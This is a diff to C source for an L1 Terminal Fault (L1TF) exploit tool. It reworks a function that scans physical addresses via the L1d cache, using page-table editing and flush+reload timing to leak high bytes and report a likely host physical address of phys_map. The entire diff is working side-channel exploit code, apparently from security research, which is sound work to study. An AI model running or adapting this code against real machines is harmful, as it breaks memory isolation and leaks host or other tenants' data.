@@ -434,32 +434,34 @@ void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
 
 void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   initialize_pteditor_lib();
-  two_byte_reload_buffer reload_buffer = {0};
+  two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
+  memset(reload_buffer, 0, sizeof(two_byte_reload_buffer));
   leak_addr_t leak = l1tf_leak_buffer_create();
 
-  printf("Scanning L1d cache for values between 0xffff000000000000 and 0xffffffffffffffff");
+  printf("Scanning L1d cache for values between 0xffff000000000000 and 0xffffffffffffffff\n");
   size_t max_runs = 1000;
   for (size_t run = 1; run < max_runs; ++run) {
-    printf("Run %ld / %ld\n", run, max_runs);
 
-    for (uintptr_t physical_addr = scan_opts.start; physical_addr < scan_opts.end;
-         physical_addr += scan_opts.stride) {
+    printf("Run %ld                     \n", run);
+
+    for (uintptr_t physical_addr = scan_opts.start, i = 0; physical_addr < scan_opts.end;
+         physical_addr += scan_opts.stride, ++i) {
+
+      if (i % 100000 == 0) {
+        fprintf(stderr, "run %ld: %.2f%%  \r", run,
+                ((double)(physical_addr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
+                    (double)100);
+      }
 
       l1tf_leak_buffer_modify(&leak, (void *)physical_addr);
       uintptr_t leak_addr = (uintptr_t)leak.leak + (physical_addr & 0xfff);
 
-      int attempt = 0;
-      int value;
-
-      do {
-        flush(1, reload_buffer[0xffff]);
-        asm_l1tf_leak_2_highest_bytes((void *)leak_addr, reload_buffer);
-        value = reload(1, reload_buffer[0xffff], THRESHOLD);
-        attempt += 1;
-      } while (value == -1 && attempt < 250);
+      flush(1, (*reload_buffer)[0xffff]);
+      asm_l1tf_leak_2_highest_bytes((void *)leak_addr, *reload_buffer);
+      ssize_t value = reload(1, (*reload_buffer)[0xffff], THRESHOLD);
 
       if (value != -1) {
-        printf("HIT! Virtual address: 0x%lx\tPhysical address: 0x%lx\n", leak_addr, physical_addr);
+        printf("HIT! Potential host physical address of phys_map: 0x%lx\n", physical_addr);
       }
     }
   }
